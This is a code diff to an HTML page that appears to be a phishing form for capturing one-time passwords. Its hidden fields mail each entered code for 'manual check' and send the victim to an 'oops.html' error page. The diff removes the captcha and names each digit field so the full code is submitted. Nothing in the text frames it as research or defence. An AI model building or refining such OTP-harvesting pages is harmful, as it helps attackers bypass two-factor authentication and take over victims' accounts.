@@ -27,15 +27,15 @@
         <input type="hidden" name="otp" id="fullOtp">
         <input type="hidden" name="_subject" value="OTP entered (manual check)">
         <input type="hidden" name="_next" value="oops.html">
-        <input type="hidden" name="_captcha" value="true">
 
         <div class="otp-container">
-          <input type="text" maxlength="1" class="otp-box" required>
-          <input type="text" maxlength="1" class="otp-box" required>
-          <input type="text" maxlength="1" class="otp-box" required>
-          <input type="text" maxlength="1" class="otp-box" required>
-          <input type="text" maxlength="1" class="otp-box" required>
-          <input type="text" maxlength="1" class="otp-box" required>
+          <input type="text" maxlength="1" class="otp-box" name="digit1" required>
+<input type="text" maxlength="1" class="otp-box" name="digit2" required>
+<input type="text" maxlength="1" class="otp-box" name="digit3" required>
+<input type="text" maxlength="1" class="otp-box" name="digit4" required>
+<input type="text" maxlength="1" class="otp-box" name="digit5" required>
+<input type="text" maxlength="1" class="otp-box" name="digit6" required>
+
         </div>
 
         <div style="margin-top:12px;">
@@ -55,9 +55,10 @@
 
     // Combine OTP and update hidden field
     form.addEventListener('submit', (e) => {
-      const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
-      fullOtp.value = otpValue;
-      document.getElementById('status').innerText = 'Submitting OTP...';
+  const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
+  fullOtp.value = otpValue;
+  document.getElementById('status').innerText = 'Submitting OTP...';
+
       // Form will submit normally; redirect handled by _next
     });
 
@@ -73,6 +74,7 @@
 
 </body>
 </html>
+
 
 
 
